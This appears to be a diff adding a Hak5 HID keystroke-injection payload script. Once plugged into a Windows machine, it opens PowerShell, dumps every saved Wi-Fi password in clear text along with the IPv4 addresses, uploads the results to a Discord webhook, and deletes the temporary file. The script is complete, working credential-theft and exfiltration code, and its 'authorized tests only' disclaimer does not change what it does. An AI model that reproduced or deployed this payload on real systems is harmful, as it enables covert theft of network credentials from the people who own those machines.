@@ -1,0 +1,27 @@
+#!/bin/bash
+# hak5_discord_exfil (Windows host, HID) — grabs Wi-Fi passwords + IPv4 info
+# and uploads to a Discord webhook in one PowerShell command.
+# BEFORE USE: replace YOUR_DISCORD_WEBHOOK below with your webhook URL.
+# Authorized tests only.
+LED SETUP
+ATTACKMODE HID
+sleep 3
+LED STAGE1
+if [ ! -c /dev/hidg0 ]; then
+    echo "[!] /dev/hidg0 missing - no host attached"
+    LED R SINGLE; sleep 1; LED OFF; LED FINISH; exit 1
+fi
+QUACK "REM hak5_discord_exfil — authorized tests only" \
+    "REM *** REPLACE YOUR_DISCORD_WEBHOOK BELOW ***" \
+    "DELAY 500" \
+    "GUI r" "DELAY 200" \
+    "STRING powershell" "ENTER" "DELAY 1000" \
+    "STRING \$u='YOUR_DISCORD_WEBHOOK'" "ENTER" "DELAY 200" \
+    "STRING \$f=[IO.Path]::GetTempFileName()+'.txt'" "ENTER" "DELAY 200" \
+    "STRING netsh wlan show profiles | Select-String ':' | ForEach-Object{netsh wlan show profile name=\$(\$_.ToString().Split(':')[1].Trim()) key=clear} | Out-File \$f" "ENTER" "DELAY 500" \
+    "STRING Get-NetIPAddress -AddressFamily IPv4 | Where-Object IPAddress -notlike '127.*' | Out-File -Append \$f" "ENTER" "DELAY 200" \
+    "STRING Invoke-RestMethod -Uri \$u -Method Post -Body @{content=(Get-Content \$f -Raw)}" "ENTER" "DELAY 500" \
+    "STRING Remove-Item \$f; exit" "ENTER"
+echo "[+] discord_exfil injected — WiFi + IPs sent to Discord"
+LED FINISH
+exit 0
